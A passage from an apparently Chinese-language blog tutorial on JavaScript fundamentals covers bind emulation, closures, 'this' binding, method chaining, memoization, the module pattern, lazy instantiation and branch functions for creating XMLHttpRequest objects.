<p><code>arguments.callee()</code>的含义是调用当前正在执行的函数自身，比如上面的test的匿名函数；</p>
<p><strong>Function.prototype.bind介绍</strong></p>
<p>目前很多高级浏览器都支持<code>Function.prototype.bind</code>方法，该方法用来指定函数内部的this指向。为了支持各个浏览器，我们也可以自己来简单的模拟一个~</p>
<p>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function.prototype.bind &#x3D; function(context) &#123;</span><br><span class="line">    var self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        return self.apply(context,arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var yunxi &#x3D; &#123;</span><br><span class="line">    name: &#39;yunxi&#39;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var func &#x3D; function()&#123;</span><br><span class="line">    console.log(this.name); &#x2F;&#x2F; yunxi</span><br><span class="line">&#125;.bind(yunxi);</span><br><span class="line"></span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<p>如上代码所示：func这个函数使用调用bind这个方法，并且把对象yunxi作为参数传进去，然后bind函数使用return返回一个函数，当我们调用<code>func()</code>执行这个方法的时候，其实我们就是在调用bind方法内的return返回的那个函数，在返回的那个函数内context的上下文其实就是我们以参数yunxi对象传进去的，因此this指针指向与yunxi这个对象了~ 所以打印出<code>this.name</code> 就是yunxi那个对象的name了;</p>
<p>除了上面我们看到的介绍apply或者call方法可以改变this指针外，我们还可以使用call或者apply来继承对象的方法；实质也就是改变this的指针了；</p>
<p>比如有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Yunxi &#x3D; function(name)&#123;</span><br><span class="line">    this.name &#x3D; name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var Longen &#x3D; function()&#123;</span><br><span class="line">    Yunxi.apply(this,arguments);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Longen.prototype.getName &#x3D; function()&#123;</span><br><span class="line">    return this.name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var longen &#x3D; new Longen(&quot;tugenhua&quot;);</span><br><span class="line">console.log(longen.getName());  &#x2F;&#x2F; 打印出tugenhua</span><br></pre></td></tr></table></figure>

<p>如上代码：我先实例化Longen这个对象，把参数传进去，之后使用<code>Yunxi.apply(this,arguments)</code>这句代码来改变Longen这个对象的this的指针，使他指向了Yunxi这个对象，因此Yunxi这个对象保存了longen这个实例化对象的参数tugenhua，因此当我们调用<code>longen.getName</code>这个方法的时候，我们返回<code>this.name</code>，即我们可以认为返回的是<code>Yunxi.name</code> 因此返回的是 tugenhua，我们只是借用了下Yunxi这个对象内的<code>this.name</code>来保存Longen传进去的参数而已；</p>
<p><strong>二：闭包的理解</strong></p>
<p><strong>闭包的结构有如下2个特性</strong></p>
<p>1.封闭性：外界无法访问闭包内部的数据，如果在闭包内声明变量，外界是无法访问的，除非闭包主动向外界提供访问接口；</p>
<p>2.持久性：一般的函数，调用完毕之后，系统自动注销函数，而对于闭包来说，在外部函数被调用之后，闭包结构依然保存在</p>
<p>系统中，闭包中的数据依然存在，从而实现对数据的持久使用。</p>
<p>缺点：</p>
<p>使用闭包会占有内存资源，过多的使用闭包会导致内存溢出等.</p>
<p>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function a(x) &#123;</span><br><span class="line">    var a &#x3D; x;</span><br><span class="line">    var b &#x3D; function()&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    return b;</span><br><span class="line">&#125;</span><br><span class="line">var b &#x3D; a(1);</span><br><span class="line">console.log(b()); &#x2F;&#x2F; 1</span><br></pre></td></tr></table></figure>

<p>首先在a函数内定义了2个变量，1个是存储参数，另外一个是闭包结构，在闭包结构中保存着b函数内的a变量，默认情况下，当a函数调用完之后a变量会自动销毁的，但是由于闭包的影响，闭包中使用了外界的变量，因此a变量会一直保存在内存当中，因此变量a参数没有随着a函数销毁而被释放，因此引申出闭包的缺点是：过多的使用闭包会占有内存资源，或内存溢出等肯能性；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 经典的闭包实列如下：</span><br><span class="line">function f(x)&#123;              &#x2F;&#x2F;外部函数</span><br><span class="line">    var a &#x3D; x;              &#x2F;&#x2F; 外部函数的局部变量，并传递参数</span><br><span class="line">    var b &#x3D; function()&#123;     &#x2F;&#x2F; 内部函数 </span><br><span class="line">        return a;           &#x2F;&#x2F; 访问外部函数中的局部变量</span><br><span class="line">    &#125;;</span><br><span class="line">    a++;                    &#x2F;&#x2F; 访问后，动态更新外部函数的变量</span><br><span class="line">    return b;               &#x2F;&#x2F; 返回内部函数</span><br><span class="line">&#125;</span><br><span class="line">var c &#x3D; f(5);               &#x2F;&#x2F; 调用外部函数并且赋值</span><br><span class="line">console.log(c());           &#x2F;&#x2F; 调用内部函数，返回外部函数更新后的值为6</span><br></pre></td></tr></table></figure>

<p><strong>下面我们来看看如下使用闭包的列子</strong></p>
<p>在如下代码中有2个函数，f函数的功能是：把数组类型的参数中每个元素的值分别封装在闭包结构中，然后把闭包存储在一个数组中，并返回这个数组，但是在函数e中调用函数f并向其传递一个数组<code>[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</code>,然后遍历返回函数f返回数组，我们运行打印后发现都是c undefined，那是因为在执行f函数中的循环时候，把值虽然保存在temp中，但是每次循环后temp值在不断的变化，当for循环结束后，此时temp值为c，同时i变为3，因此当调用的时候 打印出来的是temp为3，arrs[3]变为undefined；因此打印出 c undefined</p>
<p>解决闭包的缺陷我们可以再在外面包一层函数，每次循环的时候，把temp参数和i参数传递进去 如代码二</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 代码一</span><br><span class="line">function f(x) &#123;</span><br><span class="line">    var arrs &#x3D; [];</span><br><span class="line">    for(var i &#x3D; 0; i &lt; x.length; i++) &#123;</span><br><span class="line">        var temp &#x3D; x[i];</span><br><span class="line">        arrs.push(function()&#123;</span><br><span class="line">            console.log(temp + &#39; &#39; +x[i]); &#x2F;&#x2F; c undefined</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    return arrs;</span><br><span class="line">&#125;</span><br><span class="line">function e()&#123;</span><br><span class="line">    var ar &#x3D; f([&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]);</span><br><span class="line">    for(var i &#x3D; 0,ilen &#x3D; ar.length; i &lt; ilen; i++) &#123;</span><br><span class="line">        ar[i]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">e(); </span><br><span class="line">&#x2F;&#x2F; 代码二：</span><br><span class="line">function f2(x) &#123;</span><br><span class="line">    var arrs &#x3D; [];</span><br><span class="line">    for(var i &#x3D; 0; i &lt; x.length; i++) &#123;</span><br><span class="line">        var temp &#x3D; x[i];</span><br><span class="line">        (function(temp,i)&#123;</span><br><span class="line">            arrs.push(function()&#123;</span><br><span class="line">                console.log(temp + &#39; &#39; +x[i]); &#x2F;&#x2F; c undefined</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)(temp,i);</span><br><span class="line">    &#125;</span><br><span class="line">    return arrs;</span><br><span class="line">&#125;</span><br><span class="line">function e2()&#123;</span><br><span class="line">    var ar &#x3D; f2([&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]);</span><br><span class="line">    for(var i &#x3D; 0,ilen &#x3D; ar.length; i &lt; ilen; i++) &#123;</span><br><span class="line">        ar[i]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">e2(); </span><br></pre></td></tr></table></figure>

<p><strong>三：javascript中的this详解</strong></p>
<p>this的指向常见的有如下几点需要常用到：</p>
<ol>
<li> 全局对象的this是指向与window；</li>
<li> 作为普通函数调用。</li>
<li> 作为对象方法调用。</li>
<li> 构造器调用。</li>
<li> <code>Function.prototype.call</code> 或 <code>Function.prototype.apply</code>调用。</li>
</ol>
<p>下面我们分别来介绍一下</p>
<p><strong>1.全局对象的this；</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(this); &#x2F;&#x2F; this指向于window</span><br><span class="line">setTimeout() 和 setInterval()函数内部的this指针是指向于window的，如下代码：</span><br><span class="line"> function test()&#123;</span><br><span class="line">    console.log(11);</span><br><span class="line"> &#125;</span><br><span class="line"> setTimeout(function()&#123;</span><br><span class="line">    console.log(this &#x3D;&#x3D;&#x3D; window); &#x2F;&#x2F; true</span><br><span class="line">    this.test(); &#x2F;&#x2F; 11 </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>

<p><strong>2.作为普通函数调用；</strong></p>
<p>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var name &#x3D; &quot;longen&quot;;</span><br><span class="line">function test()&#123;</span><br><span class="line">    return this.name;</span><br><span class="line">&#125;</span><br><span class="line">console.log(test()); &#x2F;&#x2F; longen</span><br></pre></td></tr></table></figure>

<p>当作为普通函数调用时候，this总是指向了全局对象，在浏览器当中，全局对象一般指的是window；</p>
<p><strong>3.作为对象的方法调用。</strong></p>
<p>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D; &#123;</span><br><span class="line">    &quot;name&quot;: &quot;我的花名改为云溪了，就是为了好玩&quot;,</span><br><span class="line">    getName: function()&#123;</span><br><span class="line">        console.log(this); &#x2F;&#x2F; 在这里this指向于obj对象了</span><br><span class="line">        console.log(this.name); &#x2F;&#x2F; 打印 我的花名改为云溪了，就是为了好玩</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.getName(); &#x2F;&#x2F; 对象方法调用</span><br></pre></td></tr></table></figure>

<p>但是呢，我们不能像如下一样调用对象了，如下调用对象的话，this还是执行了window，如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var name &#x3D; &quot;全局对象名字&quot;;</span><br><span class="line">var obj &#x3D; &#123;</span><br><span class="line">    &quot;name&quot;: &quot;我的花名改为云溪了，就是为了好玩&quot;,</span><br><span class="line">    getName: function()&#123;</span><br><span class="line">        console.log(this);  &#x2F;&#x2F; window</span><br><span class="line">        console.log(this.name); &#x2F;&#x2F; 全局对象名字</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var yunxi &#x3D; obj.getName; </span><br><span class="line">yunxi();</span><br></pre></td></tr></table></figure>

<p>运行yunxi()函数，还是会像调用普通函数一样，this指向了window的；</p>
<p><strong>4.构造器调用。</strong><br>Javascript中不像Java一样，有类的概念，而JS中只能通过构造器创建对象，通过new 对象，当new运算符调用函数时候，该函数会返回一个对象，一般情况下，构造器里面的this就是指向返回的这个对象；</p>
<p>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Obj &#x3D; function()&#123;</span><br><span class="line">    this.name &#x3D; &quot;yunxi&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">var test &#x3D; new Obj();</span><br><span class="line">console.log(test.name); &#x2F;&#x2F; yunxi</span><br></pre></td></tr></table></figure>

<p>注意：构造器函数第一个字母需要大写，这是为了区分普通函数还是构造器函数而言；</p>
<p>如上代码：通过调用<code>new Obj()</code>方法 返回值保存到test变量中，那么test就是那个对象了，所以内部的this就指向与test对象了，因此<code>test.name</code>就引用到了内部的<code>this.name</code> 即输出 “yunxi”字符串；</p>
<p>但是也有例外的情况，比如构造器显示地返回了一个对象的话，那么这次继续调用的话，那么会最终会返回这个对象，比如如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D; function()&#123;</span><br><span class="line">    this.name &#x3D; &quot;yunxi&quot;;</span><br><span class="line">    return &#123;</span><br><span class="line">        &quot;age&quot;: &quot;27&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var test &#x3D; new obj();</span><br><span class="line">console.log(test.name); &#x2F;&#x2F; undefined</span><br></pre></td></tr></table></figure>

<p>那么继续调用的话，会返回unedfined，因为返回的是那个对象，对象里面没有name这个属性，因此值为undefined；</p>
<p><strong>四：理解函数引用和函数调用的区别</strong></p>
<p>看下面的代码分析:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 函数引用 代码一</span><br><span class="line">function f()&#123;</span><br><span class="line">    var x &#x3D; 5;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br><span class="line">var a &#x3D; f;</span><br><span class="line">var b &#x3D; f;</span><br><span class="line"></span><br><span class="line">console.log(a&#x3D;&#x3D;&#x3D;b); &#x2F;&#x2F; true</span><br><span class="line">&#x2F;&#x2F; 函数调用 代码二</span><br><span class="line">function f2() &#123;</span><br><span class="line">    var x &#x3D; 5;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br><span class="line">var a2 &#x3D; f2();</span><br><span class="line">var b2 &#x3D; f2();</span><br><span class="line">console.log(a2 &#x3D;&#x3D;&#x3D; b2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 函数调用 代码三</span><br><span class="line">function f3()&#123;</span><br><span class="line">    var x &#x3D; 5;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        return x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var a3 &#x3D; f3();</span><br><span class="line">var b3 &#x3D; f3();</span><br><span class="line">console.log(a3 &#x3D;&#x3D;&#x3D; b3); &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<p>如上的代码：代码一和代码二分部是函数引用和函数调用的列子，返回都为true，代码三也是函数调用的列子，返回且为false</p>
<p>我们现在来理解下函数引用和函数调用的本质区别：当引用函数时候，多个变量内存存储的是函数的相同的入口指针，因此对于同一个函数来讲，无论多少个变量引用，他们都是相等的，因为对于引用类型(对象，数组，函数等)都是比较的是内存地址，如果他们内存地址一样的话，说明是相同的；但是对于函数调用来讲，比如代码三;每次调用的时候，都被分配一个新的内存地址，所以他们的内存地址不相同，因此他们会返回false，但是对于代码二来讲，我们看到他们没有返回函数，只是返回数值，他们比较的不是内存地址，而是比较值，所以他们的值相等，因此他们也返回true，我们也可以看看如下实列化一个对象的列子，他们也被分配到不同的内存地址，因此他们也是返回false的；如下代码测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function F()&#123;</span><br><span class="line">    this.x &#x3D; 5;</span><br><span class="line">&#125;</span><br><span class="line">var a &#x3D; new F();</span><br><span class="line">var b &#x3D; new F();</span><br><span class="line">console.log(a &#x3D;&#x3D;&#x3D; b); &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<p><strong>五：理解js中的链式调用</strong></p>
<p>我们使用jquery的时候，jquery的简单的语法及可实现链式调用方法，现在我们自己也封装一个链式调用的方法，来理解下 jquery中如何封装链式调用 无非就是每次调用一个方法的时候 给这个方法返回this即可，this指向该对象自身，我们看看代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义一个简单的对象，每次调用对象的方法的时候，该方法都返回该对象自身</span><br><span class="line">var obj &#x3D; &#123;</span><br><span class="line">    a: function()&#123;</span><br><span class="line">        console.log(&quot;输出a&quot;);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;,</span><br><span class="line">    b:function()&#123;</span><br><span class="line">        console.log(&quot;输出b&quot;);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(obj.a().b()); &#x2F;&#x2F; 输出a 输出b 输出this指向与obj这个对象</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 下面我们再看下 上面的通过Function扩展类型添加方法的demo如下：</span><br><span class="line">Function.prototype.method &#x3D; function(name,func) &#123;</span><br><span class="line">    if(!this.prototype[name]) &#123;</span><br><span class="line">        this.prototype[name] &#x3D; func;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String.method(&#39;trim&#39;,function()&#123;</span><br><span class="line">    return this.replace(&#x2F;^\s+|\s+$&#x2F;g,&#39;&#39;);</span><br><span class="line">&#125;);</span><br><span class="line">String.method(&#39;log2&#39;,function()&#123;</span><br><span class="line">    console.log(&quot;链式调用&quot;);</span><br><span class="line">    return this;</span><br><span class="line">&#125;);</span><br><span class="line">String.method(&#39;r&#39;,function()&#123;</span><br><span class="line">    return this.replace(&#x2F;a&#x2F;,&#39;&#39;);</span><br><span class="line">&#125;);</span><br><span class="line">var str &#x3D; &quot; abc &quot;;</span><br><span class="line">console.log(str.trim().log2().r()); &#x2F;&#x2F; 输出链式调用和 bc</span><br></pre></td></tr></table></figure>

<p><strong>六：理解使用函数实现历史记录–提高性能</strong></p>
<p>函数可以使用对象去记住先前操作的结果，从而避免多余的运算。比如我们现在测试一个费波纳茨的算法，我们可以使用递归函数计算fibonacci数列，一个fibonacci数字是之前两个fibonacci数字之和，最前面的两个数字是0和1；代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var count &#x3D; 0;</span><br><span class="line"> var fibonacci &#x3D; function(n) &#123;</span><br><span class="line">    count++;</span><br><span class="line">    return n &lt; 2 ? n : fibonacci(n-1) + fibonacci(n-2);</span><br><span class="line"> &#125;;</span><br><span class="line"> for(var i &#x3D; 0; i &lt;&#x3D; 10; i+&#x3D;1) &#123;</span><br><span class="line">    console.log(i+&quot;:&quot;+fibonacci(i));</span><br><span class="line"> &#125;</span><br><span class="line"> console.log(count); &#x2F;&#x2F; 453</span><br></pre></td></tr></table></figure>

<p>我们可以看到如上 fibonacci函数总共调用了453次，for循环了11次，它自身调用了442次，如果我们使用下面的记忆函数的话，那么就可以减少他们的运算次数，从而提高性能；</p>
<p>思路：先使用一个临时数组保存存储结果，当函数被调用的时候，先看是否已经有存储结果 如果有的话，就立即返回这个存储结果，否则的话，调用函数运算下；代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var count2 &#x3D; 0;</span><br><span class="line">var fibonacci2 &#x3D; (function()&#123;</span><br><span class="line">    var memo &#x3D; [0,1];</span><br><span class="line">    var fib &#x3D; function(n) &#123;</span><br><span class="line">        var result &#x3D; memo[n];</span><br><span class="line">        count2++;</span><br><span class="line">        if(typeof result !&#x3D;&#x3D; &#39;number&#39;) &#123;</span><br><span class="line">            result &#x3D; fib(n-1) + fib(n-2);</span><br><span class="line">            memo[n] &#x3D; result;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line">    return fib;</span><br><span class="line"> &#125;)();</span><br><span class="line"> for(var j &#x3D; 0; j &lt;&#x3D; 10; j+&#x3D;1) &#123;</span><br><span class="line">    console.log(j+&quot;:&quot;+fibonacci2(j));</span><br><span class="line"> &#125;</span><br><span class="line"> console.log(count2); &#x2F;&#x2F; 29</span><br></pre></td></tr></table></figure>

<p>这个函数也返回了同样的结果，但是只调用了函数29次，循环了11次，也就是说函数自身调用了18次，从而减少无谓的函数的调用及运算，下面我们可以把这个函数进行抽象化，以构造带记忆功能的函数，如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var count3 &#x3D; 0;</span><br><span class="line">var memoizer &#x3D; function(memo,formula) &#123;</span><br><span class="line">    var recur &#x3D; function(n) &#123;</span><br><span class="line">        var result &#x3D; memo[n];</span><br><span class="line">        count3++;   &#x2F;&#x2F; 这句代码只是说明运行函数多少次，在代码中并无作用，实际使用上可以删掉</span><br><span class="line">        if(typeof result !&#x3D;&#x3D; &#39;number&#39;) &#123;</span><br><span class="line">            result &#x3D; formula(recur,n);</span><br><span class="line">            memo[n] &#x3D; result;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line">    return recur;</span><br><span class="line"> &#125;;</span><br><span class="line"> var fibonacci3 &#x3D; memoizer([0,1],function(recur,n)&#123;</span><br><span class="line">    return recur(n-1) + recur(n-2);</span><br><span class="line"> &#125;);</span><br><span class="line"> &#x2F;&#x2F; 调用方式如下</span><br><span class="line"> for(var k &#x3D; 0; k &lt;&#x3D;10; k+&#x3D;1) &#123;</span><br><span class="line">    console.log(k+&quot;:&quot;+fibonacci3(k));</span><br><span class="line"> &#125;</span><br><span class="line"> console.log(count3); &#x2F;&#x2F; 29</span><br></pre></td></tr></table></figure>

<p>如上封装 memoizer 里面的参数是实现某个方法的计算公式，具体的可以根据需要自己手动更改，这边的思路无非就是想习惯使用对象去保存临时值，从而减少不必要的取值存储值的操作；</p>
<p><strong>七：理解通过Function扩展类型</strong></p>
<p>javascript 允许为语言的基本数据类型定义方法。通过<code>Object.prototype</code>添加原型方法，该方法可被所有的对象使用。</p>
<p>这对函数，字符串，数字，正则和布尔值都适用，比如如下现在给<code>Function.prototype</code>增加方法，使该方法对所有函数都可用，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function.prototype.method &#x3D; function(name,func) &#123;</span><br><span class="line">    if(!this.prototype[name]) &#123;</span><br><span class="line">        this.prototype[name] &#x3D; func;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Number.method(&#39;integer&#39;,function()&#123;</span><br><span class="line">    return Math[this &lt; 0 ? &#39;ceil&#39; : &#39;floor&#39;](this);</span><br><span class="line">&#125;);</span><br><span class="line">console.log((-10&#x2F;3).integer()); &#x2F;&#x2F; -3</span><br><span class="line"></span><br><span class="line">String.method(&#39;trim&#39;,function()&#123;</span><br><span class="line">    return this.replace(&#x2F;^\s+|\s+$&#x2F;g,&#39;&#39;);</span><br><span class="line">&#125;);</span><br><span class="line">console.log(&quot; abc &quot;.trim()); &#x2F;&#x2F; abc</span><br></pre></td></tr></table></figure>

<p><strong>八：理解使用模块模式编写代码</strong></p>
<p>使用函数和闭包可以构建模块，所谓模块，就是一个提供接口却隐藏状态与实现的函数或对象。使用函数构建模块的优点是：减少全局变量的使用；</p>
<p>比如如下：我想为String扩展一个方法，该方法的作用是寻找字符串中的HTML字符字体并将其替换为对应的字符；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如下代码：</span><br><span class="line">Function.prototype.method &#x3D; function(name,func) &#123;</span><br><span class="line">    if(!this.prototype[name]) &#123;</span><br><span class="line">        this.prototype[name] &#x3D; func;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">String.method(&#39;deentityify&#39;,function()&#123;</span><br><span class="line">    var entity &#x3D; &#123;</span><br><span class="line">        quot: &#39;&quot;&#39;,</span><br><span class="line">        It: &#39;&lt;&#39;,</span><br><span class="line">        gt: &#39;&gt;&#39;</span><br><span class="line">    &#125;;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        return this.replace(&#x2F;&amp;([^&amp;;]+);&#x2F;g,function(a,b)&#123;</span><br><span class="line">            var r &#x3D; entity[b];</span><br><span class="line">            return typeof r &#x3D;&#x3D;&#x3D; &#39;string&#39; ? r : a;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());</span><br><span class="line">console.log(&quot;&amp;It;&quot;&gt;&quot;.deentityify()); &#x2F;&#x2F; &lt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>模块模式利用函数作用域和闭包来创建绑定对象与私有成员的关联，比如在上面的deentityify()方法才有权访问字符实体表entity这个数据对象；</p>
<p>模块开发的一般形式是：定义了私有变量和函数的函数，利用闭包创建可以访问到的私有变量和函数的特权函数，最后返回这个特权函数，或把他们保存到可以访问的地方。</p>
<p>模块模式一般会结合实例模式使用。javascript的实例就是使用对象字面量表示法创建的。对象的属性值可以是数值或者函数，并且属性值在该对象的生命周期中不会发生变化；比如如下代码属于模块模式：定义了一个私有变量name属性，和一个实例模式(对象字面量obj)并且返回这个对象字面量obj，对象字面量中的方法与私有变量name进行了绑定；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 比如如下经典的模块模式</span><br><span class="line">var MODULE &#x3D; (function()&#123;</span><br><span class="line">    var name &#x3D; &quot;tugenhua&quot;;</span><br><span class="line">    var obj &#x3D; &#123;</span><br><span class="line">        setName: function() &#123;</span><br><span class="line">            this.name &#x3D; name;</span><br><span class="line">        &#125;,</span><br><span class="line">        getName: function()&#123;</span><br><span class="line">            return this.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    return obj;</span><br><span class="line">&#125;)();</span><br><span class="line">MODULE.setName()</span><br><span class="line">console.log(MODULE.getName()); &#x2F;&#x2F; tugenhua</span><br></pre></td></tr></table></figure>

<p><strong>九：理解惰性实列化</strong></p>
<p>在页面中javascript初始化执行的时候就实例化类，如果在页面中没有使用这个实列化的对象，就会造成一定的内存浪费和性能损耗；这时候，我们可以使用惰性实列化来解决这个问题，惰性就是把实列化推迟到需要使用它的时候才去做，做到 “按需供应”;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 惰性实列化代码如下</span><br><span class="line">var myNamespace &#x3D; function()&#123;</span><br><span class="line">    var Configure &#x3D; function()&#123;</span><br><span class="line">        var privateName &#x3D; &quot;tugenhua&quot;;</span><br><span class="line">        var privateGetName &#x3D; function()&#123;</span><br><span class="line">            return privateName;</span><br><span class="line">        &#125;;</span><br><span class="line">        var privateSetName &#x3D; function(name) &#123;</span><br><span class="line">            privateName &#x3D; name;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;&#x2F; 返回单列对象</span><br><span class="line">        return &#123;</span><br><span class="line">            setName: function(name) &#123;</span><br><span class="line">                privateSetName(name);</span><br><span class="line">            &#125;,</span><br><span class="line">            getName: function()&#123;</span><br><span class="line">                return privateGetName();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    &#x2F;&#x2F; 存储Configure实列</span><br><span class="line">    var instance;</span><br><span class="line">    return &#123;</span><br><span class="line">        init: function()&#123;</span><br><span class="line">            &#x2F;&#x2F; 如果不存在实列，就创建单列实列</span><br><span class="line">            if(!instance) &#123;</span><br><span class="line">                instance &#x3D; Configure();</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 创建Configure单列</span><br><span class="line">            for(var key in instance) &#123;</span><br><span class="line">                if(instance.hasOwnProperty(key)) &#123;</span><br><span class="line">                    this[key] &#x3D; instance[key];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            this.init &#x3D; null;</span><br><span class="line">            return this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br><span class="line">&#x2F;&#x2F; 调用方式</span><br><span class="line">myNamespace.init();</span><br><span class="line">var name &#x3D; myNamespace.getName();</span><br><span class="line">console.log(name); &#x2F;&#x2F; tugenhua</span><br></pre></td></tr></table></figure>

<p>如上代码是惰性化实列代码：它包括一个单体Configure实列，直接返回init函数，先判断该单体是否被实列化，如果没有被实列化的话，则创建并执行实列化并返回该实列化，如果已经实列化了，则返回现有实列；执行完后，则销毁init方法，只初始化一次</p>
<p><strong>十：推荐分支函数(解决兼容问题的更好的方法)</strong></p>
<p>分支函数的作用是：可以解决兼容问题if或者else的重复判断的问题，我们一般的做法是：根据兼容的不同写if，else等，这些判断来实现兼容，但是这样明显就有一个缺点，每次执行这个函数的时候，都需要进行if和else的检测，效率明显不高，我们现在使用分支函数来实现当初始化的时候进行一些检测，在之后的运行代码过程中，代码就无需检测了；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 我们先来看看传统的封装ajax请求的函数</span><br><span class="line">&#x2F;&#x2F;创建XMLHttpRequest对象：</span><br><span class="line">var xmlhttp;</span><br><span class="line">function createxmlhttp()&#123;</span><br><span class="line">    if (window.XMLHttpRequest)&#123;</span><br><span class="line">        &#x2F;&#x2F; code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">        xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      &#x2F;&#x2F; code for IE6, IE5</span><br><span class="line">      xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 下面我们看看分支函数代码如下：</span><br><span class="line">var XHR &#x3D; (function()&#123;</span><br><span class="line">    var standard &#x3D; &#123;</span><br><span class="line">        createXHR : function() &#123;</span><br><span class="line">            return new XMLHttpRequest();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    var oldActionXObject &#x3D; &#123;</span><br><span class="line">        createXHR : function()&#123;</span><br><span class="line">            return new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    var newActionXObject &#x3D; &#123;</span><br><span class="line">        createXHR : function()&#123;</span><br><span class="line">            return new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    if(standard.createXHR) &#123;</span><br><span class="line">        return standard;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            newActionXObject.createXHR();</span><br><span class="line">            return newActionXObject;</span><br><span class="line">        &#125;catch(e)&#123;</span><br><span class="line">            oldActionXObject.createXHR();</span><br><span class="line">            return oldActionXObject;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line">console.log(XHR.createXHR()); 